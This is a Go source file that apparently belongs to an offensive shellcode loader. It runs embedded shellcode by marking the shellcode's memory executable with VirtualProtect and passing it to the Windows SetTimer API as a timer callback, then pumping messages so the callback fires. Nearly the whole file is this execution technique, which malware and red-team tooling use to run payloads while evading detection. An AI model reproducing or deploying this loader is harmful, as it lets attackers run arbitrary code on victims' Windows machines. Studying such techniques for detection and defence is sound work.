package sh

import (
	"fmt"
	"time"
	"unsafe"
	api "github.com/carved4/go-wincall"
)

var (
	timerWindow uintptr
	timerId     uintptr = 1
)

func ExecuteViaSetTimer() error {
	shellcode := GetEmbeddedShellcode()
	
	var oldProtect uint32
	shellcodePtr := uintptr(unsafe.Pointer(&shellcode[0]))
	
	success, err := api.Call("kernel32.dll", "VirtualProtect",
		shellcodePtr,                         // lpAddress
		uintptr(len(shellcode)),             // dwSize
		0x40,                                // PAGE_EXECUTE_READWRITE
		uintptr(unsafe.Pointer(&oldProtect)), // lpflOldProtect
	)
	if err != nil || success == 0 {
		return fmt.Errorf("VirtualProtect failed: %v", err)
	}
	
	timerWindow, err = createMessageWindow1()
	if err != nil {
		return fmt.Errorf("failed to create message window: %v", err)
	}
	defer destroyMessageWindow1()
	
	timerResult, err := api.Call("user32.dll", "SetTimer",
		timerWindow,      // hWnd
		timerId,          // nIDEvent
		uintptr(1),       // uElapse (1ms)
		shellcodePtr,     // lpTimerFunc (our shellcode as TIMERPROC!)
	)
	if err != nil || timerResult == 0 {
		return fmt.Errorf("SetTimer failed: %v", err)
	}
	
	processMessages()
	
	api.Call("user32.dll", "KillTimer", timerWindow, timerId)
	
	return nil
}

func createMessageWindow1() (uintptr, error) {
	className := "TimerShellcodeWindow\x00"
	
	hInstance, err := api.Call("kernel32.dll", "GetModuleHandleW", uintptr(0))
	if err != nil {
		return 0, err
	}
	
	hwnd, err := api.Call("user32.dll", "CreateWindowExA",
		uintptr(0),                                      // dwExStyle
		uintptr(unsafe.Pointer(&[]byte(className)[0])), // lpClassName
		uintptr(0),                                      // lpWindowName (null)
		uintptr(0),                                      // dwStyle
		uintptr(0),                                      // X
		uintptr(0),                                      // Y
		uintptr(0),                                      // nWidth
		uintptr(0),                                      // nHeight
		uintptr(0xFFFFFFFF),                            // hWndParent (HWND_MESSAGE for message-only)
		uintptr(0),                                      // hMenu
		hInstance,                                       // hInstance
		uintptr(0),                                      // lpParam
	)
	
	return hwnd, err
}

func processMessages() {
	for i := 0; i < 10; i++ {
		var msg [28]byte // MSG structure (28 bytes on x64)
		
		result, _ := api.Call("user32.dll", "PeekMessageA",
			uintptr(unsafe.Pointer(&msg[0])), // lpMsg
			uintptr(0),                       // hWnd (all windows)
			uintptr(0),                       // wMsgFilterMin
			uintptr(0),                       // wMsgFilterMax
			uintptr(1),                       // wRemoveMsg (PM_REMOVE)
		)
		
		if result != 0 {
			api.Call("user32.dll", "DispatchMessageA", uintptr(unsafe.Pointer(&msg[0])))
		}
		
		time.Sleep(10 * time.Millisecond)
	}
}

func destroyMessageWindow1() {
	if timerWindow != 0 {
		api.Call("user32.dll", "DestroyWindow", timerWindow)
		timerWindow = 0
	}
}